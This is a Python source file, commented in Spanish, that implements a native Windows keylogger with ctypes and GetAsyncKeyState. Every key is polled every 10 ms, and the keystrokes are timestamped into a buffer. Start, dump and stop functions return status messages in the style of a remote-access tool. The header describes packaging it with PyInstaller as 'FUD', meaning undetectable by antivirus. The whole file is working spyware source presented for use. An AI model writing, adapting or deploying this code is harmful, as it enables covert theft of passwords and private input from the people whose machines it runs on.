"""
╔══════════════════════════════════════════════════════════════╗
║     KEYLOGGER NATIVO - ctypes / Win32 (SIN DEPENDENCIAS)     ║
╚══════════════════════════════════════════════════════════════╝
Implementación pura en ctypes usando GetAsyncKeyState.
No requiere pynput ni ninguna librería externa.
Compatible con PyInstaller --windowed (FUD).
"""
import ctypes
import threading
import time
import platform
from datetime import datetime

# Mapa de VK Codes a caracteres legibles
VK_MAP = {
    0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]\n', 0x1B: '[ESC]',
    0x20: ' ', 0x2E: '[DEL]', 0x25: '[LEFT]', 0x26: '[UP]',
    0x27: '[RIGHT]', 0x28: '[DOWN]', 0x2C: '[PRTSC]',
    0xA0: '[LSHIFT]', 0xA1: '[RSHIFT]', 0xA2: '[LCTRL]',
    0xA3: '[RCTRL]', 0xA4: '[LALT]', 0xA5: '[RALT]',
    **{i: chr(i) for i in range(0x30, 0x5B)},  # 0-9, A-Z
    **{i: chr(i + 32) for i in range(0x41, 0x5B)},  # a-z (lowercase)
}

# Estado del keylogger
_buffer = []
_active = False
_thread = None
_lock = threading.Lock()
_prev_states = {}


def _keylog_worker():
    """Worker residente: Sondeo continuo de GetAsyncKeyState"""
    global _active, _buffer, _prev_states

    user32 = ctypes.windll.user32

    while _active:
        # Detectar si hay mayúsculas
        caps = user32.GetKeyState(0x14) & 1  # CAPS_LOCK
        shift = user32.GetAsyncKeyState(0x10) & 0x8000  # SHIFT

        for vk in range(8, 256):
            state = user32.GetAsyncKeyState(vk) & 0x0001  # Flanco de bajada
            if state:
                char = None
                if vk in VK_MAP:
                    ch = VK_MAP[vk]
                    # Manejar mayúsculas/minúsculas para letras
                    if len(ch) == 1 and ch.isalpha():
                        if (caps and not shift) or (not caps and shift):
                            ch = ch.upper()
                        else:
                            ch = ch.lower()
                    char = ch
                else:
                    char = f'[VK:{hex(vk)}]'

                if char:
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    with _lock:
                        _buffer.append(f'[{timestamp}]{char}')

        time.sleep(0.01)  # 10ms poll cycle


def start() -> str:
    """Inicia el keylogger en background."""
    global _active, _thread, _buffer

    if platform.system() != 'Windows':
        return '[ERROR] Keylogger solo disponible en Windows'

    if _active:
        return '[*] Keylogger ya estaba activo'

    _buffer = []
    _active = True
    _thread = threading.Thread(target=_keylog_worker, daemon=True)
    _thread.start()
    return '[+] Keylogger nativo activado (ctypes GetAsyncKeyState)'


def dump() -> str:
    """Devuelve y limpia el buffer actual del keylogger."""
    global _buffer
    with _lock:
        captured = ''.join(_buffer)
        _buffer = []
    return captured if captured else '[*] No hay teclas capturadas aún.'


def stop() -> str:
    """Detiene el keylogger."""
    global _active
    _active = False
    captured = dump()
    return f'[+] Keylogger detenido.\n[*] Buffer final:\n{captured}'
